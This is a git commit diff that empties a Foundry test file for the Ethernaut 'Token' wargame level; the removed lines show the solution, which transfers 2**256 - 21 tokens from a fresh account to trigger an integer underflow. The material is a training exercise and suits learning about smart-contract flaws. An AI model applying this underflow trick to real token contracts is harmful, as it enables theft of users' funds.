3f037e192abe7ae407edcc4ed024a60d250defcd
Mis4nthr0pic <121455563+Mis4nthr0pic@users.noreply.github.com>
2023-07-07 21:37:08 -0300

    Update Token.t.sol

--- src/test/Token.t.sol
+++ src/test/Token.t.sol
@@ -18,37 +18,6 @@ contract TokenTest is DSTest {
     }
 
     function testTokenHack() public {
-        /////////////////
-        // LEVEL SETUP //
-        /////////////////
-
-        TokenFactory tokenFactory = new TokenFactory();
-        ethernaut.registerLevel(tokenFactory);
-        vm.startPrank(eoaAddress);
-        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
-        Token ethernautToken = Token(payable(levelAddress));
-        vm.stopPrank();
-
-        //////////////////
-        // LEVEL ATTACK //
-        //////////////////
-
-        // Change accounts from the level was set up with, have to call the transfer function from a different account
-        vm.startPrank(address(1));
-
-        // Transfer maximum amount of tokens without causing an overflow 
-        ethernautToken.transfer(eoaAddress, (2**256 - 21));
-
-        // Switch back to original account
-        vm.stopPrank();
-        vm.startPrank(eoaAddress);
-
-        //////////////////////
-        // LEVEL SUBMISSION //
-        //////////////////////
-
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
-        vm.stopPrank();
-        assert(levelSuccessfullyPassed);
+   
     }
 }
